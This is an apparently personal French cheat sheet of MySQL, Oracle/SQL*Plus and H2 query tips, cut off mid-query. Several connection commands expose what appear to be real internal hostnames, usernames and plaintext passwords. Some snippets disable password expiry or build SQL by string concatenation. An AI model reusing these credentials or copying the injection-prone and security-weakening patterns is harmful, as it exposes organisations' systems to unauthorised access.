        inner join ps_attribute_lang on ps_attribute_lang.id_attribute=ps_attribut  e.id_attribute and id_lang=1
        where ps_product_attribute.id_product=33
        group by ps_product_attribute.id_product_attribute
        order by id_product,id_product_attribute,id_attribute

pour supprimer une primary cle primaire (sans supprimer les donnees ni la colonne)
      alter table TB0012_USER drop primary key (supprime la clef primaire. Si cette clef n'existe pas, cette commande effacera le premier index UNIQUE  de la table. (MySQL marque la première clef UNIQUE en tant que PRIMARY KEY si aucune PRIMARY KEY  n'a ete specifiee explicitement.) 
si j'ai l'erreur : Every derived table must have its own alias quand je fais un select imbrique. (select count distinct):
    c'est parce que quand je fais une requete imbrique sur mysql je dois definir un alias à ma vue view:
    au lieu de faire: 
          select count(*) from 
          (
          select nom, count(nom) from TB0002_APPLICATION group by(nom)
          )
          je dois juste rajouter  "b":
          select count(*) from 
          (
          select nom, count(nom) from TB0002_APPLICATION group by(nom)
          ) b 
pour desactiver une contrainte:
SET foreign_key_checks = 0; (on peut maintenant faire son bordel: DELETE FROM users where id > 45)
pour reactiver une contrainte:
SET foreign_key_checks = 1;

pour faire un delete:
  DELETE TB0001_LOT where IDAPPLICATION=?
pour executer une commande mysql:
      mysql --force -h $SQL_SERVER -P $SQL_PORT -u $SQL_USER  --password=$SQL_PASSWD --default-character-set=utf8 $SQL_SCHEMA<init_DB.sql 1>$LOG_INFO 2>$LOG_ERROR
      --force = continue meme si erreurs -h: host
      exemple:
      mysql --force -h vma30ads.mc2.renault.fr -P 3307 -u sra_adm  --password=sra_adm_int01 --default-character-set=utf8 sra_db_01<dumpINTSRA.sql 1>./sra_database_info.log 2>./sra_database_error.log
      mysql -h localhost -P 3306 -u root  --password=foulurecalotte --default-character-set=utf8 samicours<samicours_query1.sql 1>./samicours_database_info.log 2>./samicours_database_error.log
      mysql -u root  --password=foulurecalotte wenhuaduvergeshop<dumpsql20170807.sql 1>1sql.log 2>2sql.log
pour se connecter a mysql:
      mysql -h vma30ads.mc2.renault.fr -P 3316 -u ple_adm  --password=ple_adm_01 --default-character-set=utf8
      mysql -h localhost -P 3306 -u root  --password=foulurecalotte --default-character-set=utf8
       puis 
       USE `ple_db_01`;
en mysql to_date c'est:
     STR_TO_DATE
     exemple : mysql> SELECT STR_TO_DATE('01,5,2013','%d,%m,%Y');-> '2013-05-01'
                mysql> SELECT STR_TO_DATE('May 1, 2013','%M %d,%Y');-> '2013-05-01'
                mysql> SELECT STR_TO_DATE('May 1, 2013 23:11:22','%H:%i:%s');-> '23:11:22' (heures minutes secondes)
comparer une date en mysql: 
                      $ilyaunmois =  mktime(0,0,0,date("m" ) - 3  ,date("d" ) ,date("Y" ));
                			and UNIX_TIMESTAMP(update_date)	>".$ilyaunmois."                
faire un alter table: 
    ALTER TABLE TB0009_TAB MODIFY IDAVISTAB INT(5) null;
recuperer le dernier identifiant insere: 
		SELECT LAST_INSERT_ID() (il a l'air de bien gerer les multi connections et multi tables)
equivalent de DECODE en mysql: IF ou CASE:
	CASE:
		Select ... case (
											sum(TO_DAYS(demande_materiel . date_fin_reservation )-TO_DAYS(demande_materiel . date_debut_reservation ))
										)
      when '0' then 1
      else 
      	(
      		sum(TO_DAYS(demande_materiel . date_fin_reservation )-TO_DAYS(demande_materiel . date_debut_reservation ))
      	)
      end AS NBJOUR... from...
  IF:
  	IF(condition, si_oui, si_non)
    CASE WHEN ps_specific_price.reduction is null then 0 ELSE ps_specific_price.reduction END, // pratique pour les left join
    ou bien (mais on ne peut pas faire de like )
    CASE (un_champ)
    WHEN 'sss' THEN 'xxx'
    WHEN 'sssdfdf' THEN 'sdf'
    ELSE 'valeurpardefaut' END as color
    

pour recuperer lignes d'une annee: comme TO_DATE(xxx,'YYY')
				select * from TB0001_CAPTAGE captage, TB0006_TRANSPORTEUR tx where YEAR(DATE_PREVUE)='2009'
pour recuperer les premieres lignes d'une requete:
		Select .... LIMIT 1 ou LIMIT 1,3. Ne pas mettre de Order sinon ca peut durer tres longtemps la requete. 
pour rechercher underscore dans un champ: (caractère special)
		select * from TB0006_TRANSPORTEUR where NOM_TRANSPORTEUR like '%\_%'
DATEDIFF()
		peut etre qu'il ne vaut mieux pas utiliser cette methode bugguee?
TIMESTAMPDIFF : pour trouver la diff entre deux dates
				TIMESTAMPDIFF(interval,datetime_expr1,datetime_expr2)
				 Retourne la difference entière entre les expressions datetime_expr1 et datetime_expr2 (datetime_expr2-datetime_expr1), 
				 de format DATE et DATETIME.
				 L'unite du resultat est donne par l'argument interval.
				 Les valeurs legales de interval sont les mêmes que pour la fonction TIMESTAMPADD().
						mysql> SELECT TIMESTAMPDIFF(MONTH,'2003-02-01','2003-05-01'); -> 3
						mysql> SELECT TIMESTAMPDIFF(YEAR,'2002-05-01','2001-01-01'); -> -1
Si on a une exception Unlock timout exception:
		On peut unlocker les tables en faisant: 			UNLOCK TABLES
les plus petits resultats de chaque groupe :
      select type, min(price) as minprice
        from fruits
        group by type;
pour avoir la liste des tables de la base:
		SHOW TABLES
select max: 
		select max(ID_CAPTAGE) from TB0001_CAPTAGE
		Attention si je fais 
		      select max(ID_VERSION), ID_ACTION from TB0009_ACTION where ID_ELEMENT =143 and STATUS = -1 group by ID_ELEMENT
		      ID_VERSION et ID_ACTION ne seront pas forcement sur la meme ligne!!! le batar!
		      Solution: 
		      select ID_VERSION, ID_ACTION from TB0009_ACTION where ID_ELEMENT =14 and STATUS = -1 order by id_version desc limit 1 
si j'ai l'erreur Lock wait timeout exceeded; try restarting transaction
			soit on fait ca : 
				1/ Le problème dont tu me parles n'est pas lie à "TransactionDeadlockDetectionTimeout" qui est un paramètre NDBD (que nous n'avons pas deploye chez Renault à ma connaissance).
				2/ Le paramètre dont tu parles est lie au paramètre innodb_lock_wait_timeout.
 				3/ Le parametrage se fait dans /etc/my.cnf dans ta version actuelle de MySQL et est positionnee à 120 s (50 s est la valeur par defaut). Pour le modifier il faut effectuer un A/R de l'instance concernee.
 				 dedans commenter la ligne bind-address= 127.0.0.1 pour que mysql n'ecoute pas que localhost sinon je ne peux mas m'y connecter à distance (erreur 10061)
     				  ou bien faire ajouter sous [mysqld]:
              skip-name-resolve 
				120s est une valeur large et cette valeur est la même sur tous les environnements MySQL de Renault (comme defini dans mon template de my.cnf).
 				Je ne desire pas augmenter cette valeur dans un premier temps car si vous avez cette erreur, c'est surement lie à un problème de performance (et à la concurrence d'accès) X ou Y.
 				4/ Si vous souhaitez investiguer un problème de performance il faut preparer un scenario reproductible afin que je puisse investiguer et faire une demande ODDE chez moi (AQC).
		soit on change ca dans le fichier config.ini
						TransactionDeadlockDetectionTimeout=5000 ou 10000
						HeartbeatIntervalDbDb=3000
						HeartbeatIntervalDbApi=3000 
cle : key : index : 
		il est inutile de mettre des index sur des cles car elles sont dejà indexees. Il faut mettre des index sur les champs plutot numerique ou textuels mais pas plus longs que 100 char
		explain select blabla mon select permet de savoir comment mysql gere la requete vis a vis des index.
substrring : 
      SUBSTR(monstring,positioncommencepar1,length)
indexof :   INSTR:
        SELECT INSTR('foobarbar', 'bar');
        -> 4
H2 :
client H2: http://www.h2database.com/html/main.html
 requeter une base de donnée h2 en java
    pour voir les tables de h2 afficher : SELECT * FROM INFORMATION_SCHEMA.TABLES
      Class.forName ("org.h2.Driver");
      Connection conn = DriverManager.getConnection ("jdbc:h2:~/test", "sa",""); 
      Statement st = conn.createStatement();
         String sql = "SELECT id, first, last, age FROM Registration"; 
        ResultSet rs = stmt.executeQuery(sql);  
      Stmt.executeUpdate("sql statement");
       while(rs.next()) { 
            // Retrieve by column name 
            int id  = rs.getInt("id"); 
            int age = rs.getInt("age"); 
            String first = rs.getString("first"); 
            String last = rs.getString("last");  
            
            // Display values 
            System.out.print("ID: " + id); 
            System.out.print(", Age: " + age); 
            System.out.print(", First: " + first); 
            System.out.println(", Last: " + last); 
         }  
      conn.close(); 
       			
SQL : (oracle :)
pour me connecter en tant qu'admin dba système systeme
    sqlplus "sys as sysdba"
si le mot de passe a expire : ORA-28001: the password has expired
    se connecter en sys (admin); 
    voir les paramètres dba:  
          select * from dba_profiles; // là je vois que PASSWORD_LIFE_TIME est à 180
    puis le mettre à infini: parametrer l'expiration des mots de passe à l'infini duree non limitee
            ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;
    puis soit definir un nouveau mot de passe à un utilisateur: (on peut même remettre le même sa marche aussi si il a expire (je crois))
        sql> alter user [user_name] identified by [password];     
          
Detail description d'une table : voir les colonnes 
    describe nomtable;
pour faire un order by customise:
      order by 
            case 
               when currency = 'USD' then '001' 
               when currency = 'EUR' then '002'
               else currency
            end  desc
pour remplacer les null par autre chose : 
  nvl(PREMIERCHAMPRECUPEREPEUTETRENULL, ALORSREMPLACERPARCECHAMPLA)
pour afficher que les lignes se repetant plusieurs fois: doublons, occurences
SELECT 
            T94.CODE_ETABLISSEMENT,
            T94.CODE_ARTICLE,
            SUM(T94.QUANTITE) MAX_QUANTITE,
            MIN(T94.CODE_TYPE_DOCUMENT||'@'||T94.CODE_GAMME) DISCRIMINANT, 
            count(1)               // ca on est pas oblige de le mettre c juste pour voir combien de lignes sont pareil si on regroupe par code etablissement et code article
        FROM
            LT94_SIM_GRIL T94
        WHERE
			 T94.CODE_UTILISATEUR='invite'
	    having count(1) > 1 // toute la magie est là
		GROUP BY T94.CODE_ETABLISSEMENT, T94.CODE_ARTICLE

faire un IF avec Oracle sans plsql :
          SELECT wec53_id IdCmp2, WEC53_IDDMD IdDmd, WEC53_IDTEMPLATE IdTplCmp, wec53_dlivre livre, wec53_dnotif notif, wec53_process etat,
          (CASE WHEN phasevalidee.wec56_id <= phaseactuelle.wec56_id THEN -1 ELSE 0 END) negIfValideAndBeyond
           
faire un inner join qui ne renvoit qu'une ligne (exclure les doublons du resultat final):
						 left join (  select wec60_iddmd, min (WEC60_DCREATE) as WEC60_DCREATE     
                            from wec60_d_event
                            where wec60_action like 'REAFFECTATION DE%SERVICE-CONTROL-44200-ACCENTURE%'
                            group by wec60_iddmd) x
                on x.wec60_iddmd = wec01_id 
  ou bien     mais marche moins bien car rownum =1 renvoie la premiere ligne bof bof...
              from TATA 
                inner join (select cs.*, row_number() over (partition by cs.wec60_iddmd order by cs.wec60_iddmd) as rn from wec60_d_event cs) b  on b.wec60_iddmd = TATA.wec01_id and b.rn=1 and b.wec60_action like 'REAFFECTATION DE%SERVICE-CONTROL-44200-ACCENTURE%'
Depuis la version 11g pour concatener plusieurs lignes en une seule : 
      select wec60_iddmd, LISTAGG(commentaire,'<br>') WITHIN GROUP (ORDER BY wec60_dcreate) AS commentaire
			from 
			(
              select wec60_iddmd,wec60_dcreate, wec60_nomcreator || '('||wec60_dcreate||'): ' || wec61_coment as commentaire from wec60_d_event 
              inner join wec61_d_coment on wec61_idobj = wec60_id
              where wec60_typeobj like 'CMPONLY'
              order by wec60_iddmd, wec60_dcreate
			)      
			group by wec60_iddmd
			Ensuite pour l'integrer dans une autre requete avec un inner join :  du coup pour chaque ligne je peux avoir dans une colonne plusieurs autres lignes (ici separees par <br>) 
  			select wec53_id, wec53_deng, comments.coment from  wec53_d_cmpdmd 
            inner join (
                          select wec60_iddmd, listagg(coment,'<br>') WITHIN GROUP (ORDER BY wec60_dcreate) AS coment
                              from 
                              (
                                      select wec60_iddmd,wec60_dcreate, wec60_nomcreator || '('||wec60_dcreate||'): ' || wec61_coment as coment from wec60_d_event 
                                      inner join wec61_d_coment on wec61_idobj = wec60_id
                                      where wec60_typeobj like 'CMPONLY'
                                      order by wec60_iddmd, wec60_dcreate
                              )    
                              group by wec60_iddmd
                      ) comments on comments.wec60_iddmd = wec53_id
			
pour supprimer les retours chariot du resultat : 
      select REPLACE(REPLACE(REPLACE(comment, CHR(10)), CHR(13)), CHR(9)) comment from emp
changer une cle primaire :
            1) alter table wec52_m_champs add (WEC52_LNG Varchar2(10) null);
            2) insert into wec52_m_champs (WEC52_ID, WEC52_IDTEMPLATE, WEC52_NOM, WEC52_MAX) values (2, 1037, 'Perimeter', 10)
            3) update wec52_m_champs set WEC52_LNG = 'FRENCH'
            4) alter table wec52_m_champs modify (WEC52_LNG Varchar2(10) not null )
            5) ALTER TABLE city DROP CONSTRAINT pk_city; si ça ne marche pas c'est parce que ça a ete cree comme ça :  CONSTRAINT "PK_WECM4_ENV" PRIMARY KEY ("WECM4_LBL") USING INDEX PCTFREE 10 INITRANS 2 MAXTRANS 255 COMPUTE STATISTICS STORAGE(INITIAL 65536 NEXT 1048576 MINEXTENTS 1 MAXEXTENTS 2147483645 PCTINCREASE 0 FREELISTS 1 FREELIST GROUPS 1 BUFFER_POOL DEFAULT FLASH_CACHE DEFAULT CELL_FLASH_CACHE DEFAULT) TABLESPACE "WEC_I1" ENABLE 
                                                  dans ce cas,  essayer de supprimer l'index  : DROP INDEX pk_city; puis de refaire le alter
            6) ALTER TABLE city ADD CONSTRAINT pk_city PRIMARY KEY (city_id, buildtime, time);
            cle etrangere : ALTER TABLE agency ADD CONSTRAINT fk_agencytype FOREIGN KEY (agencytype) REFERENCES agencytype (id);
            attention time ne doit pas etre nul dans la base de donnee
              alter table toto drop column nomdcolumn
changer la session de langue :                                 
      ALTER SESSION SET NLS_LANGUAGE=german;
utiliser la session de langue : 
      ... where WEC52_LNG=(SELECT VALUE FROM NLS_SESSION_PARAMETERS where parameter like 'NLS_LANGUAGE')
group by: si j'ai l'erreur ora00979
  c parce que dans ma liste de select j'ai des champs qui ne sont pas dans ma liste de groupby.
  Je peux faire un group by comme ca : 
            SELECT distinct(WEC51_ID), count(wec55_idtemplate), WEC51_NOM, WEC51_NOMCHEF, WEC51_CLASS
              ...
              group by WEC51_ID, WEC51_NOM, WEC51_NOMCHEF, WEC51_CLASS (il en est de même pour le order by: il doit etre identique aussi dans le select et dans le order by (si to_char dans order by le mettre aussi dans le select)
SQLPLUS : sql :
roles gestion des roles dans une base de donnee: 
table user
table permission
table user_permission
table group
table user_group
table group_permission

set define on ou set define off : sert a activer ou non l'interpretation du caractere et commercial & comme etant une variable qu'on envoit à sqlplus
sqlplus ${OMS_USER}/${OMS_PASSWORD}@${OMS_TNSNAME} @OMS_CREATE_DB_v130.src ou .sql
	exemple :
 		sqlplus r08_adm/r08_adm@R08DEV @R08_libelle_PT.sql
 		sqlplus Cpi_adm/passtmp@CPI_RE7.WORLD
SQL>show all permet de voir toutes les variables du client oracle
on peut les modifier en faisant:
set output on : sert a afficher ou non les erreurs sql
ou
set echo off : sert a afficher ou non le script qu'on a execute
ou
set serveroutput on;
ou
set long 80 : sert a determiner la longueur du result des requettes à  l'affichage
ou
etc etc...
affichage lignes display lisible  ok :
    set linesize 200000
sqlplus pour executer une procedure ou une fonction:
call nomdelaprocedureoudelafonction();
SQLDEVELOPER :
avec sqldeveloppeur sqldeveloper sqldevelopper dans menu outils>surveiller les sessions 
        on peut virer des sessions connections connexions en trop
    Attention aux parametrages NLS_SESSION_PARAMETERS sur differents clients qui tappent dans la meme db. Voir aussi dans Outils>preferences>NLS 
        
  join :
    left join (tout enr table de gauche)
    right join (tout enr table de drt)
    all join (tout enr meme si qq nuls)
    inner join (que enr ou pas de null)
    attention toujours mettre les conditions apres les on sinon les join ne sont pas respectes il ne fait que des inner join
    exemple: 
    select * from TB0001_LOT
        left join TB0005_ENV_LOT on TB0001_LOT.IDLOT = TB0005_ENV_LOT.IDLOT and IDTYPEENVIRONNEMENT = 1
        et non pas 
    select * from TB0001_LOT
        left join TB0005_ENV_LOT on TB0001_LOT.IDLOT = TB0005_ENV_LOT.IDLOT    
        where  IDTYPEENVIRONNEMENT = 1
         
pour faire un order by avec des varchar qui contiennent des numeros :
      ce truc là marche bien 
            to_number(SCORE,'9999.9') ou to_float mais on dirait que ca marche moins bien
si j'ai l'erreur java.sql.SQLException: Before start of result set
		c'est parce que il faut faire resultSet.next() pour te positionner sur le premier enregistrement.
		(par la suite, cela te permet de te deplacer sur les enregistrements suivants. 

ATTENTION : faire un test avant du genre if(resultSet.hasNext()) 
pour creer un tableau (create)
		utiliser pour les dates le format datetime
		
pour faire des deletes avec des selects imbriques: 
		DELETE PVE_L_PROFILE WHERE FK_UTILISATEUR LIKE (SELECT ID FROM PVE_UTILISATEUR WHERE IPN LIKE 'v012591');
pour resoudre erreur ora, pour faire des inserts avec des selects imbriques et pour desactiver les triggers temporairement:
				INSERT INTO PVE_UTILISATEUR (ID, IPN, FK_UET, FK_ATELIER, DELETED) VALUES (pve_seq_utilisateur_id.nextval, 'v012591',NULL,NULL,'N');
				ALTER TRIGGER PVE_TR_I_ADMIN_CHECK DISABLE;
				INSERT INTO PVE_L_PROFILE (ID, FK_PROFILE, FK_UTILISATEUR) select pve_seq_profile_id.nextval, 1, PVE_UTILISATEUR.ID from PVE_UTILISATEUR where PVE_UTILISATEUR.IPN like 'v012591';
				ALTER TRIGGER PVE_TR_I_ADMIN_CHECK ENABLE;
pour renvoyer  les lignes dont la taille d'un champ est etc etc.. valable en mysql aussi:
			select * from toto where LENGTH(column) <4
trunc enleve les minutes
Pour naviguer dans les dates: TRUNC(LAST_DAY(ADD_MONTHS(SYSDATE,-1))+1)
          Pour naviger à partir des jours, heures, minutes, secondes..: 
          sysdate - ou + un chiffre. Ce chiffre l'unitee c'est le jour. 1 = 1j de la on fait le calcul: 15 minutes c'est 0.0104 jours.. on peut naviguer comme on veut. exemple: select to_char(sysdate - 0.010416, 'DDMMYY hh24:mi') from dual
					
					update operation_dossier set code_operation='27' where id_dossier like '%3ptbo1' and code_operation like '35'
					
					update DOSSIER set date_creation = to_date ('00:00:00 07/12/2001','hh24:mi:ss DD/MM/YYYY'(attention c un format oracle. En mysql ca donne: %T %d/%m/%Y)), toto="titi" where id_dossier like '00000000003pvki1'
					insert into pae99_user (pae99useripn, pae99idfrequenceseq, pae99delegataireipn, pae99abonne, pae99datelastsend, pae99datelastparam) values ('p036782', 1, null, 1, to_date('07/03/2007','dd/MM/yyyy'), to_date('09/09/2008','dd/MM/yyyy'))
					
					insert into operation_dossier (id_dossier, id_utilisateur, code_operation, date_heure, type_utilisateur, infos) values ('00000000003ptbo1', '6232254', 35, to_date ('DD/MM/YY','22/05/01'), 'EXP', '')

afficher la liste des tables de la base: 
      select table_name from tabs
		
    insert into operation_dossier (id_dossier, id_utilisateur, code_operation, date_heure, type_utilisateur, infos) values ('00000000003ptbo1', '6232254', 35, '22/05/01', 'EXP', '')

produits cartesiens :UNION : MINUS : UNION ALL : (conserve les doublons contraitement a union tout court) 
			select tatata UNION tatata
exemples avec to_char:
    select id_dossier, to_char (date_heure, 'DDMMYYYY') test from operation_dossier where code_operation like '31' and date_heure like '%052001' and rownum <4
    select * from ..... to_char(wec01_ddmd,'YYYY') >= to_char(sysdate,'YYYY')

selectà. Where à.. and to_char(date_reception,'MMDDYYYY')> 01042001 and to_char(JOUR_HEURE,'hhmm') >1256 

::e destinataire add (CONNAISSANCE_ECHEC number(2) not null)

select * from trace_fax where etat_reception like '0' and date_mail> to_date('01/07/2002', 'DD/MM/YYYY') and date_mail < to_date('15/07/2002', 'DD/MM/YYYY')

delete from classe where id_eleve like '234'

insert into profil_role select 

alter table destinataire modify (CONNAISSANCE_ECHEC varchar(2) not null)

SELECT DEM.COM_NOM || ' - ' || DEM.emplacement , decode(DEM.ent_type,'PAR', DEM.ent_nom || ' ' || DEM.ent_prenom,'ENT',DEM.ent_raison_sociale) nom FROM DOSSIER D
"La fonction DECODE(variable, code1, val1, code2, val2, ... coden, valn, valdefaut) 
est une fonction qui permet de renvoyer val1 ou val2 ou valn ou valdefaut 
selon la valeur de la variable (qui est comparee à  code1, code2, ... coden) 
"

ALTER TABLE MyTable ADD COLUMN new_column_name INTEGER ... ou en oracle: ALTER TABLE MyTable ADD new_column_name INTEGER ...
  UPDATE MyTable SET new_column_name = old_column_name;
  ALTER TABLE MyTable DROP COLUMN old_column_name;
  ou bien 
  alter table WEC52_M_CHAMPS add(WEC52_REGEXP VARCHAR2(100) null)
ASTUCE POUR VOIR DES EGALITES DANS UNE MEME COLONNE
SELECT distinct(OD1.id_dossier) from OPERATION_DOSSIER OD1, OPERATION_DOSSIER OD2 WHERE 
 OD1.code_operation = "+OperationDossier.SIGNATURE_RECEPISSE+" 
      sqlSB.append(" and OD1.date_heure BETWEEN TO_DATE('" + date_debut + "', 'DD/MM/YYYY') AND TO_DATE('" + date_fin + "', 'DD/MM/YYYY') + 1 ");
      sqlSB.append(" and OD1.id_dossier = OD2.id_dossier");
      sqlSB.append(" and OD2.code_operation = " + OperationDossier.ENVOI_RECEPISSE_SYSTEME + ")");

select exp_fax, count (*) from destinataire where exp_fax in ('05.56.39.55.93','05.58.46.65.00','05-58.04.16.05','05.58.05.59.50','05 58 08 10 65','05.56.34.42.08','05.58.04.16.73','05 58 75 64 29','05.58.82.95.82') and etat_reception like '1' group by exp_fax
SELECT distinct(password1), count (*) from declarant group by password1
incrementation
update globals set G_NUMERIC_VALUE = G_NUMERIC_VALUE+1 where G_NAME like 'UPROFS_LAST_ID#'

SELECT FROM NE1_BB_ZQG WHERE ( CODE_REGION || CODE_PCE ) = PCE.ID_POINT_COMPTAGE AND DATE_DEBUT <= sysdate AND (ID_POINT_COMPTAGE, CODE_ZQG) NOT IN (('C1717000','4'),('ACOSOING','510')) order by ID_POINT_COMPTAGE
executer les statistiques
ANALYZE TABLE T_APPL ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_CHAPITRE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_CODE_ELEMENT_LIEN_SECONDAIRE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_CRAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_CRITERION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_DOMAINE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_ECR ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_ELEMENT ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_ELEMENT_EST_ASSOCIE_SQ_PG ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_ELLEMENTAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_EST_EXPORTE_VERS ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_FAMILLE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_FAMILLEAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LANGUE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOTSURBANDE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOT_DIFFUSION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOT_EXPORT ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOT_IMPORT ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOT_IMPORT_ANOMALIE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOT_IMPORT_CH ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_NTILIEE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_NTISQQF ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_OBJECT ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_OBJECTAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_OPERATION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_OPERATIONAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PG ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PGAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PG_PR_PLANCHE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PLANCHE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PR ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PRAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_PROPERTIES ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_QF ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_QFAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_LOTSURBANDE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_SOUS_CHAPITRE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_SQ ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_SQAPOURTRADUCTION ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_SUPPORT ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_TEMP_ICPLUP ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_TEMP_UI_EXPORT ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_TITRE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_UI ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_UI_ANOMALIE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_UI_POINTER ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_UI_SCH ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_USER_DIALO ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_USER_LANGUE ESTIMATE STATISTICS SAMPLE 10 PERCENT;
ANALYZE TABLE T_VIGNETTE ESTIMATE STATISTICS SAMPLE 10 PERCENT;


sql pour la pagination (selectionner un numero limite de lignes)
    select * from ( select rownum rnum, a.* from (select N IMPORTE QUELLE REQUETE) a  where rownum <= 10) where rnum >= 5
    faux:
    select * from ( select rownum rnum, a.* from (select N IMPORTE QUELLE REQUETE) a  where rownum <= 10 and UN_CHAMP_DE_LA_REQUETE like '%toto' and ETC.. order by UN_CHAMP_DE_LA_REQUETTE ASC) where rnum >= 5
    
pour concatener il ya deux possibilites: soit deux pipes : 
    SELECT  lblfr.wec99libelle||' - '||lblen.wec99libelle SERVICE.....
    soit la methode concat()
pour mettre a jour les valeurs d'une table par une autre table: 
		update t_titre set n_ui = (select t_ui.n_ui from t_ui where id_ui_seq=t_titre.id_ui_seq)
pour updater un champ avec un bout d'autre champ
			     update set rc999IDLBL = lbl FROM RC999_LBL R1 , (select concat('OPA',substr(RC999IDLBL,4)) as lbl from RC999_LBL where RC999IDLBL like 'RC9%') as R2 where R1.RC999IDLBL = R2.RC999IDLBL;
indexof : 
  select INSTR(lechamps,'cequejecherche')
pour recuperer les orphelins d'une table par rapport à une autre table
        select * from TB0022_MOD q where q.NUMQU not in (select NUMQU from TB0013_QUE) (connais pas d'autres solutions à priori))
        Attention au dela de 1000 lignes renvoyes par la vue ce n'est plus correct. On peut aussi utiliser not exist. Exemple:
        select M.NUMQU from (select distinct NUMQU from TB0022_MOD) M where not exists (select distinct NUMQU from TB0013_QUE); (marche pas bien on dirait)
pour avoir le jour de la semaine : 
        to_char(wec01_ddmd,'Day')
Pour avoir le numero de la semaine d'une date en SQL: 
    select to_char(to_date('21/07/07'),'IW') from whatever
    autre exemple:
    select to_char(datepotentiel,'IW') FROM pve_potentiel
pour avoir l'heure :
    select to_char (R0805FERMETURE, 'hh:mm') from R0805_SITES
pour recuperer que en minuscule: (case)
    select lower(ipn_user) from tb0007_user
    select upper(ipn_user) from tb0007_user

REQUETE POUR FAIRE UN GROUP BY:
			select id_ui_seq,chemin_repair,id_lg,n_ui from 
			(
			select id_ui_seq,chemin_repair,id_lg,n_ui, count(*) a
			from 
			(
			  SELECT ut.id_ui_seq AS id_ui_seq, ut.chemin_repair AS chemin_repair, ut.id_lg AS id_lg, ut.n_ui as n_ui
			    FROM T_UI ut  
			  inner join t_ui_anomalie UA on UA.id_ui_seq = ut.id_ui_seq
			    WHERE UA.type_anomalie_ui like '%Link%'
			)    
			group by id_ui_seq,chemin_repair,id_lg,n_ui
			 )

autre astuce pour faire un Group by: 
select distinct(concat(champA, champB)), champC, champD from etc etc...

astuce de requete sql à  connaitre : 
			SELECT outer_query.id_import AS id_import, outer_query.id_lg AS id_lg, 
            (
                (
                    SELECT COUNT (tlich.id_import) FROM  t_lot_import_ch tlich,  t_ui tui, t_ui_anomalie ano  WHERE tlich.id_import = outer_query.id_import AND ano.IGNORE_ANOMALIE_UI = 1
                )
                + 
               (
                    SELECT COUNT (a.id_import)  FROM  t_lot_import_anomalie a  WHERE a.id_import=  outer_query.id_import AND a.ignore_anomalie = 1
               )
            ) AS sumerrors    
				FROM 
              (
                  SELECT	inner_query.id_import, inner_query.id_lg,	inner_query.date_import, inner_query.TYPE, inner_query.date_statut, inner_query.couleur,ROWNUM AS query_rownum
        					FROM 
                        (
                            SELECT   t.id_import, t.id_lg, t.date_import, t.TYPE, t.titre_global,  t.statut_import, t.libelle_spidoc, t.famille, t.prioritaire, t.SOURCE, t.date_livraison, t.date_prioritaire
